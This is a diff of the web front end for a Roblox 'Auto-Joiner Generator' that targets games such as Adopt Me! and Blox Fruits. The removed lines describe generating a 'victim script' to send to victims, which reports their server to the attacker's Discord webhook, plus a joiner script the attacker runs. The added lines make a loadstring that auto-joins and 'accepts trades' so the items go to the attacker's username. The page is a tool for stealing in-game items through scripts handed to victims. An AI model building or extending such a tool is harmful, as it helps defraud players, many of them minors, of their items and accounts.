@@ -65,6 +65,8 @@
             color: #4ade80;
             word-break: break-all;
             margin-bottom: 16px;
+            max-height: 300px;
+            overflow: auto;
         }
         .copy-btn {
             background: #2a2a3e;
@@ -80,14 +82,6 @@
         .status.loading { background: rgba(168,85,247,0.2); color: #a855f7; }
         .status.success { background: rgba(74,222,128,0.2); color: #4ade80; }
         .status.error { background: rgba(239,68,68,0.2); color: #ef4444; }
-        .note {
-            background: rgba(168,85,247,0.1);
-            padding: 12px;
-            border-radius: 12px;
-            font-size: 12px;
-            color: #a855f7;
-            margin-top: 16px;
-        }
         hr { margin: 20px 0; border-color: rgba(255,255,255,0.1); }
     </style>
 </head>
@@ -95,40 +89,33 @@
     <div class="container">
         <div class="card">
             <h1>⚡ Auto-Joiner Generator</h1>
-            <div class="sub">Generate scripts to catch and join victims</div>
+            <div class="sub">Generate a script that auto-joins from Discord webhooks and accepts trades</div>
             
-            <label>📡 Your Discord Webhook URL</label>
+            <label>📡 Discord Webhook URL (where victims send servers)</label>
             <input type="url" id="webhook" placeholder="https://discord.com/api/webhooks/...">
-            <div class="note">💡 Create a webhook in your Discord server → Server Settings → Integrations → Webhooks</div>
             
-            <label>🎮 Target Game</label>
+            <label>🎮 Target Game ID</label>
             <select id="gameId">
                 <option value="142823291">Murder Mystery 2 (142823291)</option>
                 <option value="2753915549">Blox Fruits (2753915549)</option>
                 <option value="3956818381">Adopt Me! (3956818381)</option>
+                <option value="6309113114">Tap Simulator (6309113114)</option>
             </select>
             
-            <label>👤 Your Roblox Username (to receive items)</label>
-            <input type="text" id="receiverName" placeholder="your_roblox_username">
+            <label>👤 Your Username (who receives the items)</label>
+            <input type="text" id="receiverName" placeholder="your_username_here">
             
-            <button id="generateBtn">✨ Generate Scripts</button>
+            <label>⏱️ Check Interval (seconds)</label>
+            <input type="number" id="interval" value="3" min="1" max="10">
+            
+            <button id="generateBtn">✨ Generate Auto-Joiner Script</button>
             
             <div id="result" style="display: none;">
                 <div class="result">
-                    <h3 style="color: white; margin-bottom: 12px;">🎯 VICTIM SCRIPT (Send this to victims)</h3>
-                    <div class="loadstring" id="victimScript"></div>
-                    
-                    <h3 style="color: white; margin: 20px 0 12px;">🚀 AUTO-JOINER SCRIPT (You run this)</h3>
-                    <div class="loadstring" id="joinerScript"></div>
-                    
-                    <button class="copy-btn" onclick="copyAll()">📋 Copy Both Scripts</button>
+                    <div class="loadstring" id="loadstringOutput"></div>
+                    <button class="copy-btn" onclick="copyLoadstring()">📋 Copy Loadstring</button>
                     <div id="statusMsg"></div>
                 </div>
-            </div>
-            
-            <hr>
-            <div style="font-size: 12px; color: #666; text-align: center;">
-                How it works: Victim runs script → Sends server to your Discord → You run joiner → Auto-joins victim
             </div>
         </div>
     </div>
@@ -138,6 +125,7 @@
             const webhook = document.getElementById('webhook').value;
             const gameId = document.getElementById('gameId').value;
             const receiverName = document.getElementById('receiverName').value;
+            const interval = document.getElementById('interval').value;
             
             if (!webhook || !webhook.includes('discord.com/api/webhooks/')) {
                 alert('Please enter a valid Discord webhook URL');
@@ -156,21 +144,20 @@
             btn.disabled = true;
             btn.textContent = '🔧 Generating...';
             resultDiv.style.display = 'block';
-            statusDiv.innerHTML = '<div class="status loading">⏳ Creating scripts on Pastefy...</div>';
+            statusDiv.innerHTML = '<div class="status loading">⏳ Creating script...</div>';
             
             try {
                 const response = await fetch('/api/generate', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ webhook, gameId, receiverName })
+                    body: JSON.stringify({ webhook, gameId, receiverName, interval })
                 });
                 
                 const data = await response.json();
                 
                 if (data.success) {
-                    document.getElementById('victimScript').textContent = data.victimLoadstring;
-                    document.getElementById('joinerScript').textContent = data.joinerLoadstring;
-                    statusDiv.innerHTML = '<div class="status success">✅ Scripts created! Copy and share.</div>';
+                    document.getElementById('loadstringOutput').textContent = data.loadstring;
+                    statusDiv.innerHTML = '<div class="status success">✅ Script created! Copy the loadstring above.</div>';
                 } else {
                     statusDiv.innerHTML = `<div class="status error">❌ Error: ${data.error}</div>`;
                 }
@@ -178,16 +165,14 @@
                 statusDiv.innerHTML = `<div class="status error">❌ Failed: ${err.message}</div>`;
             } finally {
                 btn.disabled = false;
-                btn.textContent = '✨ Generate Scripts';
+                btn.textContent = '✨ Generate Auto-Joiner Script';
             }
         }
         
-        function copyAll() {
-            const victim = document.getElementById('victimScript').textContent;
-            const joiner = document.getElementById('joinerScript').textContent;
-            const combined = `-- VICTIM SCRIPT:\n${victim}\n\n-- AUTO-JOINER SCRIPT:\n${joiner}`;
-            navigator.clipboard.writeText(combined);
-            alert('✅ Scripts copied!');
+        function copyLoadstring() {
+            const code = document.getElementById('loadstringOutput').textContent;
+            navigator.clipboard.writeText(code);
+            alert('✅ Loadstring copied!');
         }
     </script>
 </body>
